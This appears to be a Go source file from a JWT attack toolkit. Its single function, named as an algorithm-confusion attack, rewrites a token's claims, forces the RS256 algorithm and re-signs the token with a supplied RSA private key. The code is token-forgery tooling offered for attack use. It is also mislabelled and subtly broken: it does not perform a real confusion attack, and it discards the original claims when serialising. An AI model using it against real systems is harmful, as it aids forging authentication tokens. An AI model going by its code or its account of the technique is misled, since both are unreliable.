package jwt

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
)

func ConfusionAtack(tokenString string, newPayload map[string]interface{}, privateKeyPEM string) (string, error) {
	token, err := ParseToken(tokenString)
	if err != nil {
		return "", fmt.Errorf("failed to parse token: %v", err)
	}

	block, _ := pem.Decode([]byte(privateKeyPEM))
	if block == nil {
		return "", errors.New("failed to parse PEM block containing the private key")
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf("failed to parse private key: %v", err)
	}

	token.Header["alg"] = "RS256"
	for key, value := range newPayload {
		token.Payload[key] = value
	}

	headerBytes, err := json.Marshal(token.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %v", err)
	}

	payloadBytes, err := json.Marshal(newPayload)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %v", err)
	}

	headerEncoded := base64.RawURLEncoding.EncodeToString(headerBytes)
	payloadEncoded := base64.RawURLEncoding.EncodeToString(payloadBytes)
	signingInput := fmt.Sprintf("%s.%s", headerEncoded, payloadEncoded)

	hash := sha256.Sum256([]byte(signingInput))

	signature, err := rsa.SignPKCS1v15(nil, privateKey, crypto.SHA256, hash[:])
	if err != nil {
		return "", fmt.Errorf("failed to sign token: %v", err)
	}

	signatureEncoded := base64.RawURLEncoding.EncodeToString(signature)
	newTokenString := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, signatureEncoded)
	return newTokenString, nil
}
